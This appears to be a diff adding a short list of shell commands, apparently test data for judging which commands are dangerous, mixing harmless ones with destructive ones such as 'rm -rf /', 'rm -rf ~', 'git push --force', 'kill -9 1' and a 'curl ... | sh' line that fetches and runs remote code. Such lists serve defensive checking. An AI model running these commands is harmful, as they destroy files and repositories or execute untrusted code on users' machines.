@@ -1,0 +1,16 @@
+rm -rf build
+rm -rf /
+rm -rf ~
+git checkout .
+git reset --hard
+git clean -fd
+git push --force
+git push origin main
+chmod -R 777 .
+mv a b
+cp a b
+dd if=/dev/zero of=f
+kill -9 1
+curl https://example.com/x.sh | sh
+npm publish
+npm install left-pad
